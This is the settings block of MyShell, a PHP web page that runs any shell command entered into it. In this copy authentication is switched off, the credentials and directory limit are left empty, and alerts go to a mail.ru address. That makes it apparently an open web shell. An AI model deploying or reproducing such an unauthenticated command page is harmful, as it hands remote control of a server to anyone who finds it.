<?php
<?php
/*
  **************************************************************
  *                        MyShell                             *
  **************************************************************
  $Id: shell.php,v 1.1.0 beta 2001/09/23 23:25:12 digitart Exp $

  An interactive PHP-page that will execute any command entered.
  See the files README and INSTALL or http://www.digitart.net  for
  further information.
  Copyright ?001 Alejandro Vasquez <admin@digitart.com.mx>
  based on the original program phpShell by Martin Geisler

  This program is free software; you can redistribute it and/or
  modify it under the terms of the GNU General Public License
  as published by the Free Software Foundation; either version 2
  of the License, or (at your option) any later version.

  This program is distributed in the hope that it will be useful,
  but WITHOUT ANY WARRANTY; without even the implied warranty of
  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
  GNU General Public License for more details.

  You can get a copy of the GNU General Public License from this
  address: http://www.gnu.org/copyleft/gpl.html#SEC1
  You can also write to the Free Software Foundation, Inc., 59 Temple
  Place - Suite 330, Boston, MA  02111-1307, USA.
*/

#$selfSecure enables built-in authenticate feature. This must be 0 in order to
#use .htaccess file or other alternative method to control access to MyShell.
#Set up your user and password using $shellUser and $shellPswd.
#DO NOT TURN THIS OFF UNLESS YOU HAVE AN ALTERNATE METHOD TO PROTECT
#ACCESS TO THE SCRIPT.

$selfSecure = 0;
$shellUser  = "";
$shellPswd  = "";

#$adminEmail is the email address to send warning notifications in case
#someone tries to access the script and fails to provide correct user and
#password. This only works if you have $selfSecure enabeled.

$adminEmail = "******@mail.ru";

#$fromEmail is the email address warning messages are sended from.
#This defaults to the server admin, but you can change
#to any address you want i.e.: noreplay@yourdomain.com
#This only works if you have $selfSecure enabeled.

$fromEmail  = $HTTP_SERVER_VARS["SERVER_ADMIN"];

#$dirLimit is the top directory allowed to change when using cd command
#or the form selector. Any attempt to change to a directory up to this
#level bounces MyShell to this directory. i.e.: $dirLimit = "/home";
#It is a good practice to set it to $DOCUMENT_ROOT using:
#$dirLimit = $DOCUMENT_ROOT;
#If you want to have access to all server directories leave it blank.
#WARNING: Althought a user won't be able to snoop on directories above
#this level using MyShell, he/she will still be able to excecute
#commands on any directory where Webserver has permission,
#i.e.: mkdir /tmp/mydir or cat /home/otheruser/.htaccess.

$dirLimit = "";

#$autoErrorTrap Enable automatic error traping if command returns error.
#Bear in mind that MyShell executes the command a second time in order to
#trap the stderr. This shouldn't be a problem in most cases.
#If you turn it off, you'll have to select either to trap stderr or not for
#every command you excecute.

$autoErrorTrap = 1;

#$voidCommands is the list of commands that MyShell won't run by any means.
#It defaults to known problematic commands from a web interface like pico,
#top, xterm but also it can include specific commands you don't want to
#be excecuted from MyShell, i.e.: dig, ping, info, kill etc.

$voidCommands  = array("top","xterm","su","vi","pico","netscape");

#$TexEd Built-in Text Editor prefered name. This is the command you'll use
#to invoke MyShell's built in text editor.
# If you are used to type pico or vi for your fav text editor,
#change this to your please. i.e.:
#  $TexEd = "pico";
#will allow you to type 'pico config.php' to edit the file config.php
#MyShell's text editor do not support usual commands in pico, vi etc.
#Don't forget to take off this command from the $voidCommands list
$TexEd  = "edit";

#$editWrap selects to use or not wrap in the editor's textarea. Wrap OFF
#is usefull when you have to edit files with long lines, i.e.: in php code
#files, because otherwise it is no easy to distinguish a real new line (CR)
#from a wraped one. If you prefer to stick to the default wraped mode of
#TEXTAREA just leave this blank i.e.: $editWrap="".
$editWrap ="wrap='OFF'";

?>